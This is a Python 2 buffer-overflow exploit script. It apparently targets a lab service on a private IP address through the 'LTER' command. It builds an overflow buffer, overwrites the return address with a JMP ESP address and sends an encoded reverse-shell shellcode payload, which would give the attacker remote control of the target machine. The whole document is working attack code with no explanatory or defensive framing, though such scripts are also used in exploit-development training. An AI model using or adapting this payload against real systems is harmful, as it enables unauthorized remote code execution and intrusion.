#!/usr/bin/env python

import sys
import socket


host = '192.168.1.10'
port = 9999


try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

except:

	print 'Socket() failed'
	sys.exit(1)

EIP_redirect = '\x03\x12\x50\x62' #JMP ESP address in little-endian
reverse_shell = (
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x68\x68\x4c\x42\x37\x70"
"\x47\x70\x65\x50\x53\x50\x4c\x49\x58\x65\x54\x71\x69\x50\x73"
"\x54\x4e\x6b\x46\x30\x50\x30\x6e\x6b\x61\x42\x56\x6c\x4c\x4b"
"\x73\x62\x36\x74\x6e\x6b\x72\x52\x56\x48\x34\x4f\x6c\x77\x30"
"\x4a\x51\x36\x35\x61\x6b\x4f\x6c\x6c\x55\x6c\x35\x31\x51\x6c"
"\x64\x42\x64\x6c\x65\x70\x6b\x71\x38\x4f\x64\x4d\x65\x51\x6a"
"\x67\x6d\x32\x38\x72\x43\x62\x30\x57\x6c\x4b\x52\x72\x74\x50"
"\x4e\x6b\x30\x4a\x77\x4c\x4e\x6b\x72\x6c\x57\x61\x44\x38\x4d"
"\x33\x47\x38\x67\x71\x6a\x71\x53\x61\x6e\x6b\x70\x59\x71\x30"
"\x66\x61\x7a\x73\x6c\x4b\x77\x39\x56\x78\x48\x63\x45\x6a\x52"
"\x69\x4c\x4b\x74\x74\x6c\x4b\x56\x61\x7a\x76\x34\x71\x6b\x4f"
"\x6e\x4c\x49\x51\x6a\x6f\x44\x4d\x53\x31\x48\x47\x46\x58\x79"
"\x70\x63\x45\x59\x66\x55\x53\x71\x6d\x4b\x48\x37\x4b\x71\x6d"
"\x76\x44\x63\x45\x68\x64\x76\x38\x4e\x6b\x50\x58\x44\x64\x75"
"\x51\x68\x53\x73\x56\x6e\x6b\x66\x6c\x62\x6b\x6c\x4b\x46\x38"
"\x75\x4c\x57\x71\x58\x53\x4c\x4b\x75\x54\x6e\x6b\x43\x31\x58"
"\x50\x6f\x79\x70\x44\x37\x54\x66\x44\x63\x6b\x51\x4b\x53\x51"
"\x53\x69\x71\x4a\x66\x31\x39\x6f\x6d\x30\x61\x4f\x73\x6f\x50"
"\x5a\x4c\x4b\x35\x42\x58\x6b\x6e\x6d\x31\x4d\x72\x48\x74\x73"
"\x54\x72\x33\x30\x67\x70\x32\x48\x54\x37\x71\x63\x46\x52\x73"
"\x6f\x36\x34\x62\x48\x70\x4c\x42\x57\x31\x36\x66\x67\x59\x6f"
"\x79\x45\x6e\x58\x4e\x70\x56\x61\x75\x50\x35\x50\x64\x69\x69"
"\x54\x61\x44\x56\x30\x65\x38\x71\x39\x4f\x70\x42\x4b\x45\x50"
"\x4b\x4f\x39\x45\x50\x50\x42\x70\x32\x70\x50\x50\x77\x30\x50"
"\x50\x61\x50\x52\x70\x35\x38\x4b\x5a\x36\x6f\x79\x4f\x49\x70"
"\x6b\x4f\x79\x45\x4e\x77\x33\x5a\x53\x35\x33\x58\x79\x50\x6f"
"\x58\x67\x71\x46\x6d\x62\x48\x64\x42\x57\x70\x75\x54\x68\x52"
"\x4d\x59\x78\x66\x61\x7a\x64\x50\x51\x46\x51\x47\x65\x38\x6d"
"\x49\x6c\x65\x72\x54\x75\x31\x39\x6f\x39\x45\x4c\x45\x49\x50"
"\x42\x54\x76\x6c\x79\x6f\x62\x6e\x66\x68\x64\x35\x5a\x4c\x42"
"\x48\x4a\x50\x6e\x55\x6e\x42\x30\x56\x4b\x4f\x79\x45\x65\x38"
"\x72\x43\x32\x4d\x50\x64\x37\x70\x6c\x49\x4b\x53\x31\x47\x52"
"\x77\x52\x77\x54\x71\x39\x66\x43\x5a\x77\x62\x43\x69\x66\x36"
"\x6a\x42\x6b\x4d\x50\x66\x58\x47\x43\x74\x75\x74\x45\x6c\x47"
"\x71\x73\x31\x4e\x6d\x71\x54\x57\x54\x44\x50\x4b\x76\x37\x70"
"\x63\x74\x51\x44\x32\x70\x32\x76\x33\x66\x73\x66\x67\x36\x43"
"\x66\x70\x4e\x56\x36\x32\x76\x43\x63\x53\x66\x51\x78\x51\x69"
"\x5a\x6c\x35\x6f\x4b\x36\x79\x6f\x38\x55\x4c\x49\x59\x70\x52"
"\x6e\x42\x76\x77\x36\x59\x6f\x46\x50\x65\x38\x44\x48\x4c\x47"
"\x55\x4d\x43\x50\x39\x6f\x4e\x35\x6f\x4b\x6b\x4e\x46\x6e\x36"
"\x52\x7a\x4a\x62\x48\x4c\x66\x6c\x55\x4f\x4d\x6f\x6d\x59\x6f"
"\x79\x45\x67\x4c\x73\x36\x31\x6c\x74\x4a\x4f\x70\x79\x6b\x69"
"\x70\x54\x35\x75\x55\x4f\x4b\x50\x47\x35\x43\x33\x42\x62\x4f"
"\x51\x7a\x65\x50\x70\x53\x59\x6f\x38\x55\x41\x41")

buff = '\x41' * 2003 + EIP_redirect + reverse_shell + '\x43' * (3000-2003-4-len(reverse_shell))


command = 'LTER /.:/' + buff

s.connect((host, port))
print s.recv(1024)
s.send(command)
print s.recv(1024)
s.close()
